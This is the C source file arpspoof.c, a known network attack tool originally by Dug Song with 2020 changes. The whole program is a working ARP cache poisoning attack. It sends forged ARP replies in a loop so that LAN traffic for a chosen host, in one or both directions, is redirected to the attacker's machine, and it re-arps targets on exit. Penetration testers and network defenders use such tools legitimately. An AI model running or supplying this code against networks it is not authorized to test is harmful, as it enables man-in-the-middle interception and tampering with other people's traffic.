/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 *
 * Improved 2020 by Yeauty <YeautyYE@gmail.com>
 */

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#ifdef __APPLE__
#include <net/ethernet.h>
#endif

#include "arp.h"
#include "version.h"

#ifndef __APPLE__
extern char *ether_ntoa(struct ether_addr *);
#endif

struct host {
	in_addr_t ip;
	struct ether_addr mac;
};

static libnet_t *l;
static struct host spoof = {0};
static struct host *targets;
static char *intf;
static int poison_reverse;

static uint8_t *my_ha = NULL;
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op,
	u_int8_t *sha, in_addr_t spa,
	u_int8_t *tha, in_addr_t tpa,
	u_int8_t *me)
{
	int retval;

	if (!me) me = sha;

	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);
	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)me));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);
	if (retval)
		fprintf(stderr, "%s", libnet_geterror(l));

	libnet_clear_packet(l);

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
}

static int arp_find_all() {
	struct host *target = targets;
	while(target->ip) {
		if (arp_find(target->ip, &target->mac)) {
			return 1;
		}
		target++;
	}

	return 0;
}

static void
cleanup(int sig)
{
	int fw = arp_find(spoof.ip, &spoof.mac);
	int bw = poison_reverse && targets[0].ip && arp_find_all();
	int i;
	int rounds = (cleanup_src_own*5 + cleanup_src_host*5);

	fprintf(stderr, "Cleaning up and re-arping targets...\n");
	for (i = 0; i < rounds; i++) {
		struct host *target = targets;
		while(target->ip) {
			uint8_t *src_ha = NULL;
			if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
				src_ha = my_ha;
			}
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			if (fw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&spoof.mac, spoof.ip,
					 (target->ip ? (u_int8_t *)&target->mac : brd_ha),
					 target->ip,
					 src_ha);
				/* we have to wait a moment before sending the next packet */
				sleep(1);
			}
			if (bw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&target->mac, target->ip,
					 (u_int8_t *)&spoof.mac,
					 spoof.ip,
					 src_ha);
				sleep(1);
			}
			target++;
		}
	}

	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int c;
	int n_targets;
	char *cleanup_src = NULL;

	spoof.ip = 0;
	intf = NULL;
	poison_reverse = 0;
	n_targets = 0;

	/* allocate enough memory for target list */
	targets = calloc( argc+1, sizeof(struct host) );

#ifndef __APPLE__
	if ((l = libnet_init(LIBNET_LINK, NULL, libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);
#else
	if ((l = libnet_init(LIBNET_LINK, "en0", libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);
#endif


	while ((c = getopt(argc, argv, "ri:t:c:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
			if ((targets[n_targets++].ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
				usage();
			break;
		case 'r':
			poison_reverse = 1;
			break;
		case 'c':
			cleanup_src = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();

	if (poison_reverse && !n_targets) {
		errx(1, "Spoofing the reverse path (-r) is only available when specifying a target (-t).");
		usage();
	}

	if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
		/* only use our own hw address when cleaning up,
		 * not jeopardizing any bridges on the way to our
		 * target
		 */
		cleanup_src_own = 1;
		cleanup_src_host = 0;
	} else if (strcmp(cleanup_src, "host")==0) {
		/* only use the target hw address when cleaning up;
		 * this can screw up some bridges and scramble access
		 * for our own host, however it resets the arp table
		 * more reliably
		 */
		cleanup_src_own = 0;
		cleanup_src_host = 1;
	} else if (strcmp(cleanup_src, "both")==0) {
		cleanup_src_own = 1;
		cleanup_src_host = 1;
	} else {
		errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
		usage();
	}

	if ((spoof.ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
		usage();
	
	libnet_destroy(l);
	
	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
		errx(1, "%s", pcap_ebuf);
	
	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);

	struct host *target = targets;
	while(target->ip) {
		if (target->ip != 0 && !arp_find(target->ip, &target->mac))
			errx(1, "couldn't arp for host %s",
			libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
		target++;
	}

	if (poison_reverse) {
		if (!arp_find(spoof.ip, &spoof.mac)) {
			errx(1, "couldn't arp for spoof host %s",
			     libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
		}
	}

	if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
		errx(1, "Unable to determine own mac address");
	}

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	for (;;) {
    if (!n_targets) {
      arp_send(l, ARPOP_REPLY, my_ha, spoof.ip, brd_ha, 0, my_ha);
    } else {
		struct host *target = targets;
		while(target->ip) {
			arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
				(target->ip ? (u_int8_t *)&target->mac : brd_ha),
				target->ip,
				my_ha);
			if (poison_reverse) {
				arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
			}
			target++;
		}
    }

		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
